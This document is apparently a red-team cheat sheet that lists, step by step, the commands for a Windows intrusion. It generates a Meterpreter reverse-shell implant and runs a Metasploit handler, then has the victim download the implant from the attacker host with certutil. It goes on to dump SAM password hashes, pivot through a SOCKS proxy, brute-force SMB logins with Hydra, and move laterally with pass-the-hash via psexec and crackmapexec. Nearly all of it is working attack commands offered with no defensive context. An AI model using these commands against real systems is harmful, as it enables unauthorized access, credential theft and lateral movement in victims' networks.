# stable access
#### generate implant  
> msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 LHOST=***192.168.1.100*** -f exe -o implant.exe  
#### start c2  
> msfconsole  
> use exploit/multi/handler  
> set payload windows/x64/meterpreter_reverse_tcp  
> set lport 443  
> set lhost ***192.168.1.100***  
> run -j  
#### start webserver for implant download
> python3 -m http.server 80
#### windows LOLBIN basic download of implant
> certutil -urlcache -f http://***192.168.1.100***/implant.exe implant.exe  

# actions on target
#### attempt to get SYSTEM privs
> getsystem  
#### dump SAM
> hashdump
#### set up pivoting
##### in meterpreter session
> arp  
> ipconfig  
> netstat  
> background  
##### from msfconsole
> use post/multi/manage/autoroute  
> set session ***1***  
> set subnet ***192.168.2.0***  
> set netmask ***255.255.255.0***  
> run  
> use auxiliary/server/socks_proxy  
> set srvport 9050  
> set version 4a  
> run  
##### from bash
> proxychains nmap -Pn -p445 ***192.168.2.10*** --script=smb-enum*  
> proxychains hydra -p password1 -l administrator smb://***192.168.2.10***  
#### pass-the-hash
##### in meterpreter session
> hashdump  
> *Administrator:500:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef*  
> background
##### from msfconsole
> use exploit/windows/smb/psexec  
> set rhosts ***192.168.1.9***  
> set smbdomain .  
> set smbuser Administrator  
> set smbpass aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef  
> set payload windows/x64/meterpreter/bind_tcp  
> set lhost ***192.168.1.100***  
> run
##### from bash
> crackmapexec smb ***192.168.1.9*** -u "Administrator" -H 5835048ce94ad0564e29a924a03510ef --local-auth  

